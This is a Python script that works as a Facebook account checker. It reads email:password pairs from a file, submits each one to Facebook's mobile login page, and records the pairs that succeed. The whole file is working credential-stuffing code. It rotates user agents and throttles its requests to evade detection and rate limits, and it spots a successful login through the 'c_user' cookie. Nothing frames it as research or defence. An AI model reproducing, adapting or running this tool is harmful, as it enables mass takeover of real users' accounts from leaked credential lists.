import requests
import random
import time

class AccountTester():
	def __init__(self):
		#
		# [banner_str the banner asccii art]
		# @type {String}
		#
		self.banner_str = '''
		                 _        _                     _       ___  
		                | |      (_)                   | |     / _ \ 
		  ___ __ _ _ __ | |_ __ _ _ _ __   ___ ___   __| | ___| | | |
		 / __/ _` | '_ \| __/ _` | | '_ \ / __/ _ \ / _` |/ _ \ | | |
		| (_| (_| | |_) | || (_| | | | | | (_| (_) | (_| |  __/ |_| |
		 \___\__,_| .__/ \__\__,_|_|_| |_|\___\___/ \__,_|\___|\___/ 
		          | |                                                
		          |_|                                                

		'''

		#
		# [input_file_name the file name with accounts]
		# @type {String}
		#
		self.input_file_name = "accounts.txt"

		#
		# [output_file_name the output file name]
		# {String}
		#
		self.output_file_name = "accounts-tested.txt"
		
		#
		# [account_index the current account in the iterator]
		# @type {Number}
		#
		self.account_index = 0

		#
		# [accounts the accounts]
		# @type {Array}
		#
		self.accounts = None

		#
		# [account_separator the account separator in list]
		# @type {String}
		#
		self.account_separator = ":"

		#
		# [output_separator the output buffer separator]
		# @type {String}
		#
		self.output_separator = "|"

		#
		# [current_account the dictionary that will be uploaded]
		# @type {Dictionary}
		#
		self.current_account = {"email":"", "passwd":""}

		#
		# [output_buffer the buffer to write the output]
		# @type {Array}
		#
		self.output_buffer = []

		#
		# [facebook_login_url the facebook mobile login page]
		# @type {String}
		#
		self.facebook_login_url = "https://m.facebook.com/login.php"

		#
		# [request_headers post request headers]
		# @type {Dictionary}
		#
		self.request_headers = {
			"user-agent":""
		}

		#
		# [request_fields the requests fields]
		# @type {Dictionary}
		#
		self.request_fields = {
			"email":"",
			"pass":""
		}

		#
		# [user_agents description]
		# @type {Array}
		#
		self.user_agents = [
			"Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
			"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586",
			"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
			"Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.1.1; SHIELD Tablet Build/LMY48C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
			"Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36",
			"Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36",
			"Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
			"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22",
			"Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
			"AppleTV5,3/9.1.1",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
			"Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
			"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
		]

		#
		# [limit_requests limit the number of requests and delay 5 minutes]
		# @type {Number}
		#
		self.limit_requests = 50

		#
		# [requests_delay the delay of the current request]
		# @type {Number}
		#
		self.requests_delay = 30

	# [next_account simple iterator that allows to get next account in queue to process]
	# @return {Map} 	[the account to be processed]
	def next_account(self):
		try:
			#split the account by separator
			splited_account = self.accounts[self.account_index].split(self.account_separator);
			
			self.current_account["email"] = splited_account[0].strip()
			self.current_account["passwd"] = splited_account[1]

			#format the current password
			self.current_account["passwd"] = self.current_account["passwd"].replace("\n", "");

			#increase the counter
			self.account_index += 1

			#if there is more accounts then return true
			return True
		except IndexError as e:
			return False

	# [parse_accounts read the accounts from input file and transform it into list data structure]
	def parse_accounts(self):
		#read the file and pass the lines to the account handler
		with open(self.input_file_name, "r") as file_handler:
			self.accounts = file_handler.readlines()

	# [print_current_account prints the current account beign processed]
	def print_current_account(self):
		print("email: {0}, password: {1}".format(self.current_account["email"], self.current_account["passwd"]))

	# [iterate_accounts move forward into accounts queue and process each one]
	def iterate_accounts(self):
		#used to count requests
		request_counter = 0

		#temporary output string
		output_string = ""

		#iterate all accounts and test the facebook credentials
		while self.next_account():
			#make one offset request
			if request_counter <= self.limit_requests:
					request_counter = request_counter+1
					#sleep five minutes
			else:
				print("Putting the main thread to sleep arround 30 seconds") 
				time.sleep(self.requests_delay)
				request_counter = 0

			output_string = "email: [{0}], pass: [{1}]".format(self.current_account["email"], self.current_account["passwd"])

			#if the credential was accepted then add one dictionary to the output buffer and change the status to accepted to true
			if self.test_facebook_credentials():
				self.output_buffer.append({"email": self.current_account["email"], "passwd": self.current_account["passwd"]})
				output_string = output_string+', \033[37;42m'+'accepted'+'\033[0;m'
				self.save_results()
			else: 
				output_string = output_string+', \033[37;41m'+'rejected'+'\033[0;m'
			
			print(output_string)
			output_string = "" #redefine the output string
		
	# [test_facebook_credentials tests the user credentials in mobile facebook site]
	# @return {Boolean} 	[true: if the user was succesfuly logged]
	def test_facebook_credentials(self):
		#set the current account and override the old one
		self.request_fields["email"] = self.current_account["email"]
		self.request_fields["pass"] = self.current_account["passwd"]

		self.request_headers["user-agent"] = self.get_random_user_agent()

		facebook_session = requests.session()

		#navigate in the index page
		facebook_response = facebook_session.get("https://m.facebook.com")

		#make the request with the payload of data
		facebook_response = facebook_session.post(self.facebook_login_url, data=self.request_fields, headers=self.request_headers, allow_redirects=False)

		#if c_user in cookies the login was successful
		return 'c_user' in facebook_response.cookies

	# [get_random_user_agent generates random numbers in one range to get one random and different user agent]
	# @return {String}		[one random user agent string]
	def get_random_user_agent(self):
		return self.user_agents[random.randint(0, len(self.user_agents)-1)]

	# [map_output iterates the logged accounts and print it]
	def map_output(self, d):
		return "{1}{0}{2}\n".format(self.output_separator, d["email"], d["passwd"])
	
	def save_results(self):
		#open the file to save the results and override the output file
		with open(self.output_file_name, "w+") as file_handler:
			file_handler.write(self.map_output(self.current_account))

	def print_banner(self):
		print(self.banner_str)

	def run(self):
		self.print_banner()
		self.parse_accounts()
		self.iterate_accounts()


if __name__ == '__main__':
	account_tester = AccountTester()
	account_tester.run()